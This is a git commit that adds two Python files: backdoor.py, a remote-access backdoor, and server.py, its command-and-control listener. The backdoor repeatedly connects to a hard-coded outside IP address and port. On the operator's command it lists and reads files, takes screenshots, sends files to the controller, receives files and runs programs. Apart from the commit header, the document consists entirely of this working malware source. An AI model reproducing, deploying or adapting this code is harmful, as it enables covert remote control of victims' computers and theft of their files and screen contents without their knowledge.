356d75c1816f9ccea4078619d2adf8baab74e5da
Advaid V <143535369+Advaidv121@users.noreply.github.com>
2023-10-15 01:45:36 +0530

    Add files via upload

---
+++ backdoor.py
@@ -0,0 +1,165 @@
+import os
+import subprocess
+import tqdm
+import pyautogui
+import socket
+import time
+import json
+def pwd():
+    send1(os.getcwd())
+def cd(stri):
+    try:
+        data=' '.join(stri)
+        if "\\" in data:
+            os.chdir(data)
+            send1("changed to "+os.getcwd())
+        elif data == "..":
+            data1=os.getcwd()
+            for i in range(len(data1)):
+                if data1[i] == "\\":
+                    last=i
+            os.chdir(data1[:last])
+            send1("changed to "+os.getcwd())
+
+        else:
+            os.chdir(os.getcwd()+"\\"+data)
+            send1("changed to "+os.getcwd())
+    except FileNotFoundError:
+        if "/" in data:
+            send1("Use / insted of \\")
+        else:
+            send1("file not found")
+
+def ls(path):
+    path1=''.join(path)
+    all1 = ""
+    try:
+        arr1 = os.listdir(path1)
+        sender = ""
+        for i in arr1:
+            if os.path.isdir(i):
+                sender = sender + i +" -d" +"\n"
+            else :
+                sender = sender + i + " -f"+"\n"
+        send1(sender)
+    except FileNotFoundError:
+        if "/" in path1:
+            send1("Use / insted of \\")
+        else:
+            send1("ls: file not found")
+def cat(path1):
+    path12=''.join(path1)
+    with open(path12) as rdf:
+        content=rdf.read()
+        send1(content)
+def python1(d1):
+    send12=0
+    completed_process = subprocess.run([d1[0],d1[1]], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+    if completed_process.returncode == 0:
+        send1(completed_process.stdout)
+    else:
+        send1("\n ... Execution Failed ... \n")
+
+#files --------------------------------------------------------------------
+def sendf(imgpth):
+    SEPARATOR = "<SEPARATOR>"
+    filesize = os.path.getsize(imgpth)
+    s.send(f"{imgpth}{SEPARATOR}{filesize}".encode())
+    time.sleep(0.2)
+    with open(imgpth, "rb") as f:
+        while True:
+            # read the bytes from the file
+            bytes_read = f.read(4096)
+            if not bytes_read:
+                # file transmitting is done
+                break
+            # we use sendall to assure transimission in 
+            # busy networks
+            s.sendall(bytes_read)
+            # update the progress bar
+
+    
+def send1(datasend):
+    jsdata = json.dumps(datasend)
+    s.send(jsdata.encode())
+
+def recv():
+    data1 =''
+    while True:
+        try:
+            data1 = data1 + s.recv(1024).decode().rstrip()
+            return json.loads(data1)
+        except ValueError:
+            continue
+def recvf():
+    SEPARATOR = "<SEPARATOR>"
+    received = s.recv(4096).decode()
+    filename, filesize = received.split(SEPARATOR)
+    filename = os.path.basename(filename)
+    filesize = int(filesize)
+    with open(filename, "wb") as f:
+        size1=0
+        while size1 < filesize:
+            bytes_read = s.recv(4096)
+            if not bytes_read:
+                # No data received; you can add a timeout here if needed
+                break
+            f.write(bytes_read)
+            size1 += len(bytes_read)
+   
+
+def menu():
+    while True:
+        a = recv()
+        time.sleep(0.2)
+        b = a.split()
+        match b[0]:
+            case "cd":
+                cd(b[1:])
+            case "pwd":
+                pwd()
+            case "ls":
+                if len(b) == 1:
+                    ls(os.getcwd())
+                else:
+                    ls(b[1:])
+                
+            case "bye":
+                send1("\n Bye .... \n")
+                break
+            case "scrst":   # files
+                    myScreenshot = pyautogui.screenshot()
+                    imgpth1 = "img.png"
+                    myScreenshot.save(imgpth1)
+                    sendf(imgpth1)
+            case "copy":
+                sendf(''.join(b[1:]))
+            case "cat":
+                if len(b)>=2:
+                    cat(b[1:])
+                else:
+                    send1("Invalid cat command")
+            case "python":
+                python1(b)
+            case "send":
+                recvf()
+            case "python3":
+                python1(b)
+            case _:
+                send1("Not found this?...")
+
+def conect1():
+    while True:
+        time.sleep(10)
+        try:
+            s.connect(('68.183.89.11',5555))
+            menu()
+            s.close()
+            break
+        except:
+            continue
+            
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #(ipv4,tcp)
+conect1()
+
+
---
+++ server.py
@@ -0,0 +1,123 @@
+import socket
+import json
+import tqdm
+import os
+import time
+def send1(datasend):
+    jsdata = json.dumps(datasend)
+    target.send(jsdata.encode())
+def recv():
+    data1 =''
+    while True:
+        try:
+            data1 = data1 + target.recv(1024).decode().rstrip()
+            return json.loads(data1)
+        except ValueError:
+            continue
+def recvf():
+    SEPARATOR = "<SEPARATOR>"
+    received = target.recv(4096).decode()
+    filename, filesize = received.split(SEPARATOR)
+    filename = os.path.basename(filename)
+    filesize = int(filesize)
+    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+    with open(filename, "wb") as f:
+        size1=0
+        while size1 < filesize:
+            bytes_read = target.recv(4096)
+            if not bytes_read:
+                # No data received; you can add a timeout here if needed
+                break
+            f.write(bytes_read)
+            progress.update(len(bytes_read))
+            size1 += len(bytes_read)
+            print(size1, filesize)
+
+def sendf(imgpth1):
+
+    imgpth = ''.join(imgpth1)
+    SEPARATOR = "<SEPARATOR>"
+    filesize = os.path.getsize(imgpth)
+    target.send(f"{imgpth}{SEPARATOR}{filesize}".encode())
+    progress = tqdm.tqdm(range(filesize), f"Sending {imgpth}", unit="B", unit_scale=True, unit_divisor=1024)
+    time.sleep(0.2)
+    with open(imgpth, "rb") as f:
+        while True:
+            # read the bytes from the file
+            bytes_read = f.read(4096)
+            if not bytes_read:
+                # file transmitting is done
+                break
+            # we use sendall to assure transimission in 
+            # busy networks
+            target.sendall(bytes_read)
+            # update the progress bar
+            progress.update(len(bytes_read))
+        print("transmission done")
+
+def targcom():
+    while True:
+        command = input(str(ip)+":")
+        command.strip()
+        if len(command)>1:
+            send1(command)
+            command1 = command.split()
+            match command1[0]:
+                case "scrst":
+                    recvf()
+                    print("transfer complete")
+                case "copy":
+                    recvf()
+                    print("copy complete")
+                case "send":
+                    sendf(command1[1:])
+                case "lsl":
+                    cd1=os.getcwd()
+                    a= os.listdir(cd1)
+                    sender = ""
+                    if a:
+                        for i in a:
+                            if os.path.isdir(i):
+                                sender = sender + i +" -d" +"\n"
+                            else :
+                                sender = sender + i + " -f"+"\n"
+                        print(sender)
+                    else:
+                        print("empty")
+                case "pwdl":
+                    print(os.getcwd())
+                case "cdl":
+                        try:
+                            data=' '.join(command1[1:])
+                            if "\\" in data:
+                                os.chdir(data)
+                                print("changed to "+os.getcwd())
+                            elif data == "..":
+                                data1=os.getcwd()
+                                for i in range(len(data1)):
+                                    if data1[i] == "\\":
+                                        last=i
+                                os.chdir(data1[:last])
+                                print("changed to "+os.getcwd())
+                    
+                            else:
+                                os.chdir(os.getcwd()+"\\"+data)
+                                print("changed to "+os.getcwd())
+                        except FileNotFoundError:
+                            send1("file not found")
+                
+                case _:
+                    result = recv()
+                    print(result)
+                    if "Bye ...." in result:
+                        sock.close()
+                        exit(0)
+        else:
+            print("Invalid command")
+sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.bind(('68.183.89.11',5555))
+print("Listening for connections")
+sock.listen(5)
+target , ip=sock.accept()
+print("Connection established"+str(ip))
+targcom()
